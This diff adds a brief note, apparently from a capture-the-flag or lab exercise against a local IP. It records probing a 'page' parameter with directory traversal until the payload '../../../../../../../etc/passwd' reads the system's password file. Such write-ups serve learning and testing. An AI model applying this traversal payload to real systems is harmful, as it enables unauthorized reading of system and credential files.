@@ -1,0 +1,11 @@
+# The http://192.168.18.130/?page=[Variable] normally outputs an alert like:
+Wtf ?
+
+# Entering http://192.168.18.130/?page=includes/../, it outputs a different alert:
+Wrong again
+
+# Entering http://192.168.18.130/?page=../../../../../../../, it ouputs another alert:
+You can do it !
+
+# After trying different files, I found this :
+http://192.168.18.130/?page=../../../../../../../etc/passwd
